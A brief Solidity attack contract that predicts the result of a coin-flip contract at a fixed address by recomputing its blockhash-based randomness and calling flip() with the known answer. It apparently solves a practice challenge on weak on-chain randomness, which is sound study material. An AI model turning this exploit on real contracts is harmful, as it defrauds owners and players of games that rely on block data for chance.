// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

abstract contract CoinFlicInterface {
    function flip(bool _guess) public virtual returns (bool);
}

contract CoinFlicAttack {
    address CoinFlicAddress = 0x26F7Af5E5289b468B8175a799EC2cA978D99886E;
    CoinFlicInterface coinFlicContract = CoinFlicInterface(CoinFlicAddress);
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;


    function flipAttack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinFlicContract.flip(side);
    }
}